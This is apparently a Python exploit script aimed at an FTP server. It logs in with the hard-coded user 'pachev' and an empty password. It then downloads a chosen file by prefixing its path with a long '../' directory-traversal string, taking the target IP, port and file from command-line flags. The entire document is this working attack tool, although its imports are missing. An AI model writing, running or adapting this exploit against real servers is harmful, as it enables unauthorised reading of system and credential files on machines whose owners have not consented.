#
#

class FTPc:
    def __init__(self, connection):
        self.connection = connection

    def listdir(self, _path):
        file_list = []
        
        try:
            self.connection.cwd(_path)
        except Exception as exp:
            return []
        else:
            self.connection.retrlines('LIST', lambda x: file_list.append(x.split()))
            return file_list

    def getfile(self, _path_file):
        f_name = os.path.basename(_path_file)
        try:
            self.connection.retrbinary('RETR %s'  % _path_file , open(f_name, 'wb').write)
        except Exception as exp:
            ...

def main(ip,port,*args):
    try:
        connection = FTP()
        connection.connect(str(ip),int(port))
        connection.login('pachev', '')
        ftpc = FTPc(connection)
    except Exception as exp:
        print("Couldn't connect to FTP")
    tra= "../../../../../../../.."
    if rflag:
        ftpc.getfile(tra + rflag)

def get_opts():
    """ Get CLI argument flags """
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', required=True, help= "Target FTP IP")
    parser.add_argument('-p', required=True, help="Target FTP Port")
    parser.add_argument('-r', help= "Target File Path")
    parser.add_argument('-l',  help="Target List Path")
    args = parser.parse_args()
    return args.i, args.p, args.r, args.l

if __name__ == '__main__':
    iflag, pflag, rflag, lflag  = get_opts()
    main(iflag,pflag)